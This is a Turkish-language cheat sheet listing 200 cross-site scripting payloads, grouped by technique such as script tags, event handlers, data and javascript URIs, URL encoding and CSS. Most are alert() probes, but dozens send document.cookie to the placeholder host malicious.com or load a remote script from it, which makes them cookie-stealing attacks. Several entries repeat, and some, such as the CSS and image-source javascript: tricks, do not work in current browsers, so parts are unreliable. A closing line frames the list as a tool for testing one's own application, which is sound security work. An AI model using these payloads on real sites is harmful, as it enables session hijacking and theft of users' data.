# 200 XSS Payload'ları

## Basit Script Payload'ları
1. `<script>alert('XSS')</script>`
2. `<img src="x" onerror="alert('XSS')">`
3. `<svg/onload=alert('XSS')>`
4. `<iframe src="javascript:alert('XSS')"></iframe>`
5. `<input onfocus="alert('XSS')">`
6. `<a href="javascript:alert('XSS')">Click me</a>`
7. `<body onload="alert('XSS')">`
8. `<form action="javascript:alert('XSS')"><button>Submit</button></form>`
9. `<div style="background-image: url(javascript:alert('XSS'))">`
10. `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">`

## HTML5 ve CSS Payload'ları
11. `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">`
12. `<video src="javascript:alert('XSS')"></video>`
13. `<audio src="javascript:alert('XSS')"></audio>`
14. `<canvas onmouseover="alert('XSS')"></canvas>`
15. `<object data="javascript:alert('XSS')"></object>`
16. `<embed src="javascript:alert('XSS')"></embed>`
17. `<details open ontoggle="alert('XSS')">`
18. `<summary onclick="alert('XSS')">Click me</summary>`
19. `<marquee onstart="alert('XSS')">`
20. `<progress value="0" onmouseover="alert('XSS')"></progress>`

## JavaScript ve JSON Payload'ları
21. `<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>`
22. `<script>eval('alert(document.cookie)')</script>`
23. `<script>document.write('<img src="x" onerror="alert(document.cookie)">')</script>`
24. `<script src="https://malicious.com/xss.js"></script>`
25. `<script>window.location = 'javascript:alert("XSS")'</script>`
26. `<script>fetch('https://malicious.com/?data=' + encodeURIComponent(document.cookie))</script>`
27. `<script>window['constructor']['prototype']['alert']('XSS')</script>`
28. `<script>document.body.innerHTML = '<img src="x" onerror="alert(1)">'</script>`
29. `<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src="x" onerror="alert(2)">' } })</script>`
30. `<script>eval("fetch('https://malicious.com/?cookie='+document.cookie)")</script>`

## Atak Şekilleri
31. `<script>alert(1) //</script>`
32. `<script>alert(1); //</script>`
33. `<script>/*</script><script>alert(1)</script>`
34. `<img src="x" onerror="javascript:alert('XSS')">`
35. `<iframe src="javascript:alert('XSS')"></iframe>`
36. `<style>@import url("javascript:alert('XSS')")</style>`
37. `<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>`
38. `<div style="content: url('javascript:alert(1)');"></div>`
39. `<a href="data:text/html,<script>alert('XSS')</script>">Click me</a>`
40. `<button onclick="alert('XSS')">Click me</button>`

## Encoded Payload'lar
41. `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`
42. `%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28%27XSS%27%29%22%3E`
43. `%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E`
44. `%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E`
45. `%3Cinput%20onfocus%3D%22alert%28%27XSS%27%29%22%3E`
46. `%3Ca%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20me%3C%2Fa%3E`
47. `%3Cbody%20onload%3D%22alert%28%27XSS%27%29%22%3E`
48. `%3Cform%20action%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3Cbutton%3ESubmit%3C%2Fbutton%3E%3C%2Fform%3E`
49. `%3Cdiv%20style%3D%22background-image%3A%20url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E`
50. `%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%22%3E`

## DOM Manipülasyonu Payload'ları
51. `<script>document.getElementById('test').innerHTML = '<img src=x onerror=alert(1)>'</script>`
52. `<script>document.body.appendChild(document.createElement('img')).src='x';document.body.appendChild(document.createElement('script')).src='javascript:alert(1)'</script>`
53. `<script>var img = document.createElement('img'); img.src = 'x'; img.onerror = function() { alert(1); }; document.body.appendChild(img);</script>`
54. `<script>var link = document.createElement('a'); link.href = 'javascript:alert(1)'; link.innerText = 'Click me'; document.body.appendChild(link);</script>`
55. `<script>document.body.innerHTML += '<img src=x onerror=alert(1)>'</script>`
56. `<script>document.body.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>')</script>`
57. `<script>document.write('<img src="x" onerror="alert(1)">')</script>`
58. `<script>document.body.insertAdjacentHTML('afterbegin', '<img src=x onerror=alert(1)>')</script>`
59. `<script>var script = document.createElement('script'); script.src = 'javascript:alert(1)'; document.body.appendChild(script);</script>`
60. `<script>document.body.innerHTML = '<a href="javascript:alert(1)">Click me</a>'</script>`

## Inline Event Handlers
61. `<div onclick="alert('XSS')">Click me</div>`
62. `<a href="javascript:void(0)" onclick="alert('XSS')">Click me</a>`
63. `<input type="text" onfocus="alert('XSS')">`
64. `<button onclick="alert('XSS')">Click me</button>`
65. `<select onchange="alert('XSS')"><option value="">Select me</option></select>`
66. `<textarea onfocus="alert('XSS')">Click me</textarea>`
67. `<a href="javascript:alert('XSS')">Click me</a>`
68. `<p onmouseover="alert('XSS')">Hover over me</p>`
69. `<div onmouseover="alert('XSS')">Hover over me</div>`
70. `<form onsubmit="alert('XSS')"><input type="submit"></form>`

## Document Writing Payload'ları
71. `<script>document.write('<img src="x" onerror="alert(1)">')</script>`
72. `<script>document.open();document.write('<img src="x" onerror="alert(1)">');document.close();</script>`
73. `<script>document.body.innerHTML += '<script>alert(1)<\/script>'</script>`
74. `<script>document.body.innerHTML = '<script>alert(1)<\/script>'</script>`
75. `<script>document.body.insertAdjacentHTML('beforeend', '<script>alert(1)<\/script>')</script>`
76. `<script>document.body.innerHTML += '<iframe src="javascript:alert(1)"></iframe>'</script>`
77. `<script>document.body.insertAdjacentHTML('beforeend', '<iframe src="javascript:alert(1)"></iframe>')</script>`
78. `<script>document.body.innerHTML = '<object data="javascript:alert(1)"></object>'</script>`
79. `<script>document.body.insertAdjacentHTML('beforeend', '<object data="javascript:alert(1)"></object>')</script>`
80. `<script>document.body.innerHTML = '<embed src="javascript:alert(1)"></embed>'</script>`

## Custom Protocol Payload'ları
81. `<a href="data:text/html,<script>alert(1)</script>">Click me</a>`
82. `<a href="data:text/html,<script>fetch('https://malicious.com?cookie=' + document.cookie)</script>">Click me</a>`
83. `<a href="data:text/html,<script>eval('alert(1)')</script>">Click me</a>`
84. `<a href="data:text/html,<script>document.write('<img src=x onerror=alert(1)>')</script>">Click me</a>`
85. `<a href="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>">Click me</a>`
86. `<a href="data:text/html,<script>eval('alert(document.cookie)')</script>">Click me</a>`
87. `<a href="data:text/html,<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src=x onerror=alert(2)>' } })</script>">Click me</a>`
88. `<a href="data:text/html,<script>eval("fetch('https://malicious.com/?cookie='+document.cookie)")</script>">Click me</a>`
89. `<a href="data:text/html,<script>window['constructor']['prototype']['alert']('XSS')</script>">Click me</a>`
90. `<a href="data:text/html,<script>document.body.innerHTML = '<img src=x onerror=alert(1)>'</script>">Click me</a>`

## Various Advanced Payload'lar
91. `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://malicious.com/?cookie='+document.cookie)"></svg>`
92. `<script>document.body.innerHTML = '<iframe src="javascript:fetch(\'https://malicious.com/?cookie=\' + document.cookie)"></iframe>'</script>`
93. `<script>document.body.innerHTML = '<video src="javascript:alert(1)"></video>'</script>`
94. `<script>document.body.innerHTML = '<audio src="javascript:alert(1)"></audio>'</script>`
95. `<script>document.body.innerHTML = '<canvas onmouseover="alert(1)"></canvas>'</script>`
96. `<script>document.body.innerHTML = '<object data="javascript:alert(1)"></object>'</script>`
97. `<script>document.body.innerHTML = '<embed src="javascript:alert(1)"></embed>'</script>`
98. `<script>document.body.innerHTML = '<details open ontoggle="alert(1)">Details</details>'</script>`
99. `<script>document.body.innerHTML = '<summary onclick="alert(1)">Summary</summary>'</script>`
100. `<script>document.body.innerHTML = '<marquee onstart="alert(1)">Marquee</marquee>'</script>`

## Special Encoded Payload'lar
101. `%3Cscript%3Efetch%28%27https%3A%2F%2Fmalicious.com%2F%3Fcookie%3D%27%20%2B%20document.cookie%29%3C%2Fscript%3E`
102. `%3Cscript%3Eeval%28%27alert%28document.cookie%29%27%29%3C%2Fscript%3E`
103. `%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22x%22%20onerror%3D%22alert%28document.cookie%29%22%3E%27%29%3C%2Fscript%3E`
104. `%3Cscript%20src%3D%22https%3A%2F%2Fmalicious.com%2Fxss.js%22%3E%3C%2Fscript%3E`
105. `%3Cscript%3Ewindow.location%20%3D%20%27javascript%3Aalert%28%27XSS%27%29%27%3C%2Fscript%3E`
106. `%3Cscript%3Efetch%28%27https%3A%2F%2Fmalicious.com%2F%3Fdata%3D%27%20%2B%20encodeURIComponent%28document.cookie%29%29%3C%2Fscript%3E`
107. `%3Cscript%3Ewindow%5B%27constructor%27%5D%5B%27prototype%27%5D%5B%27alert%27%5D%28%27XSS%27%29%3C%2Fscript%3E`
108. `%3Cscript%3Edocument.body.innerHTML%20%3D%20%27%3Cimg%20src%3D%22x%22%20onerror%3Dalert%281%29%3E%27%3C%2Fscript%3E`
109. `%3Cscript%3EObject.defineProperty%28window%2C%20%27alert%27%2C%20%7B%20value%3A%20function%28%29%20%7B%20document.body.innerHTML%20%3D%20%27%3Cimg%20src%3Dx%20onerror%3Dalert%282%29%3E%27%20%7D%20%7D%29%3C%2Fscript%3E`
110. `%3Cscript%3Eeval%28%22fetch%28%27https%3A%2F%2Fmalicious.com%2F%3Fcookie%3D%27%2Bdocument.cookie%29%22%29%3C%2Fscript%3E`

## Inline JavaScript ve CSS Payload'ları
111. `<div style="background:url('javascript:alert(1)')">Click me</div>`
112. `<a style="background:url('javascript:alert(1)')">Click me</a>`
113. `<input style="background:url('javascript:alert(1)')">`
114. `<button style="background:url('javascript:alert(1)')">Click me</button>`
115. `<select style="background:url('javascript:alert(1)')"><option>Option</option></select>`
116. `<textarea style="background:url('javascript:alert(1)')">Text</textarea>`
117. `<iframe style="background:url('javascript:alert(1)')"></iframe>`
118. `<style>body:before { content: url('javascript:alert(1)'); }</style>`
119. `<style>@import url("javascript:alert(1)");</style>`
120. `<style>body { background: url('javascript:alert(1)'); }</style>`

## Advanced JavaScript and JSON Payload'ları
121. `<script>fetch('https://malicious.com?cookie=' + encodeURIComponent(document.cookie))</script>`
122. `<script>eval('fetch("https://malicious.com?cookie=" + document.cookie)')</script>`
123. `<script>document.body.innerHTML = '<script src="https://malicious.com/xss.js"></script>'</script>`
124. `<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src=x onerror=fetch("https://malicious.com?cookie=" + document.cookie)>' } })</script>`
125. `<script>eval('fetch("https://malicious.com?cookie=" + document.cookie)')</script>`
126. `<script>document.body.innerHTML = '<iframe src="javascript:fetch(\'https://malicious.com?cookie=\' + document.cookie)"></iframe>'</script>`
127. `<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<script>alert(1)<\/script>' } })</script>`
128. `<script>document.body.innerHTML = '<style>@import url("javascript:fetch(\'https://malicious.com?cookie=\' + document.cookie)")</style>'</script>`
129. `<script>eval("Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src=x onerror=fetch(\'https://malicious.com?cookie=\' + document.cookie)>' } })")</script>`
130. `<script>document.body.innerHTML = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'</script>`

## Frame, Object, Embed Payload'ları
131. `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`
132. `<object data="data:text/html,<script>alert(1)</script>"></object>`
133. `<embed src="data:text/html,<script>alert(1)</script>"></embed>`
134. `<iframe src="javascript:alert(1)"></iframe>`
135. `<object data="javascript:alert(1)"></object>`
136. `<embed src="javascript:alert(1)"></embed>`
137. `<iframe src="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>"></iframe>`
138. `<object data="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>"></object>`
139. `<embed src="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>"></embed>`
140. `<iframe src="javascript:fetch('https://malicious.com/?cookie=' + document.cookie)"></iframe>`

## Image Payload'ları
141. `<img src="javascript:alert(1)">`
142. `<img src="javascript:fetch('https://malicious.com?cookie=' + document.cookie)">`
143. `<img src="data:text/html,<script>alert(1)</script>">`
144. `<img src="data:text/html,<script>fetch('https://malicious.com?cookie=' + document.cookie)</script>">`
145. `<img src="data:text/html,<script>alert(document.cookie)</script>">`
146. `<img src="data:text/html,<script>eval('alert(1)')</script>">`
147. `<img src="data:text/html,<script>document.write('<img src=x onerror=alert(1)>')</script>">`
148. `<img src="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>">`
149. `<img src="data:text/html,<script>eval('alert(document.cookie)')</script>">`
150. `<img src="data:text/html,<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src=x onerror=alert(2)>' } })</script>">`

## JavaScript Event Handlers
151. `<button onclick="alert(1)">Click me</button>`
152. `<a href="#" onclick="alert(1)">Click me</a>`
153. `<img src="x" onerror="alert(1)">`
154. `<div onclick="alert(1)">Click me</div>`
155. `<span onclick="alert(1)">Click me</span>`
156. `<input onfocus="alert(1)">`
157. `<select onchange="alert(1)"><option>Option</option></select>`
158. `<textarea oninput="alert(1)">Text</textarea>`
159. `<iframe onload="alert(1)"></iframe>`
160. `<video onplay="alert(1)"></video>`

## CSS Payload'ları
161. `<style>body:before { content: url('javascript:alert(1)'); }</style>`
162. `<style>body:after { content: url('javascript:alert(1)'); }</style>`
163. `<style>div { background: url('javascript:alert(1)'); }</style>`
164. `<style>body { background: url('javascript:alert(1)'); }</style>`
165. `<style>@import url("javascript:alert(1)");</style>`
166. `<style>@import url("data:text/html,<script>alert(1)</script>");</style>`
167. `<style>body { background-image: url('data:text/html,<script>alert(1)</script>'); }</style>`
168. `<style>@import url("data:text/html,<script>alert(1)</script>");</style>`

## HTML Comments
169. `<!-- <script>alert(1)</script> -->`
170. `<!-- <img src="x" onerror="alert(1)"> -->`
171. `<!-- <iframe src="javascript:alert(1)"></iframe> -->`
172. `<!-- <object data="javascript:alert(1)"></object> -->`
173. `<!-- <embed src="javascript:alert(1)"></embed> -->`
174. `<!-- <script src="https://malicious.com/xss.js"></script> -->`
175. `<!-- <style>@import url("javascript:alert(1)");</style> -->`
176. `<!-- <style>@import url("data:text/html,<script>alert(1)</script>");</style> -->`

## Non-standard Payload'lar
177. `<input type="image" src="javascript:alert(1)">`
178. `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`
179. `<object data="data:text/html,<script>alert(1)</script>"></object>`
180. `<embed src="data:text/html,<script>alert(1)</script>"></embed>`
181. `<a href="javascript:alert(1)">Click me</a>`
182. `<a href="javascript:fetch('https://malicious.com?cookie=' + document.cookie)">Click me</a>`
183. `<a href="javascript:eval('alert(1)')">Click me</a>`
184. `<a href="data:text/html,<script>alert(1)</script>">Click me</a>`
185. `<a href="data:text/html,<script>fetch('https://malicious.com?cookie=' + document.cookie)</script>">Click me</a>`
186. `<a href="data:text/html,<script>eval('alert(document.cookie)')</script>">Click me</a>`
187. `<a href="data:text/html,<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src=x onerror=alert(2)>' } })</script>">Click me</a>`
188. `<a href="data:text/html,<script>eval("fetch('https://malicious.com/?cookie='+document.cookie)")</script>">Click me</a>`
189. `<a href="data:text/html,<script>window['constructor']['prototype']['alert']('XSS')</script>">Click me</a>`
190. `<a href="data:text/html,<script>document.body.innerHTML = '<img src=x onerror=alert(1)>'</script>">Click me</a>`

## Form Payload'ları
191. `<form action="javascript:alert(1)"><input type="submit" value="Submit"></form>`
192. `<form action="data:text/html,<script>alert(1)</script>"><input type="submit" value="Submit"></form>`
193. `<form action="javascript:fetch('https://malicious.com/?cookie=' + document.cookie)"><input type="submit" value="Submit"></form>`
194. `<form action="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>"><input type="submit" value="Submit"></form>`
195. `<form action="javascript:eval('alert(1)')"><input type="submit" value="Submit"></form>`
196. `<form action="data:text/html,<script>eval('alert(1)')</script>"><input type="submit" value="Submit"></form>`
197. `<form action="data:text/html,<script>Object.defineProperty(window, 'alert', { value: function() { document.body.innerHTML = '<img src=x onerror=alert(1)>' } })</script>"><input type="submit" value="Submit"></form>`
198. `<form action="data:text/html,<script>fetch('https://malicious.com/?cookie=' + document.cookie)</script>"><input type="submit" value="Submit"></form>`
199. `<form action="data:text/html,<script>eval('alert(document.cookie)')</script>"><input type="submit" value="Submit"></form>`
200. `<form action="data:text/html,<script>document.body.innerHTML = '<img src=x onerror=alert(2)>'</script>"><input type="submit" value="Submit"></form>`

Bu liste ile XSS türlerini test edebilirsiniz. Her payload'un bir XSS açığını test etme potansiyeli vardır, bu nedenle uygulamanızda test ederken dikkatli olun ve güvenlik önlemleri alın.
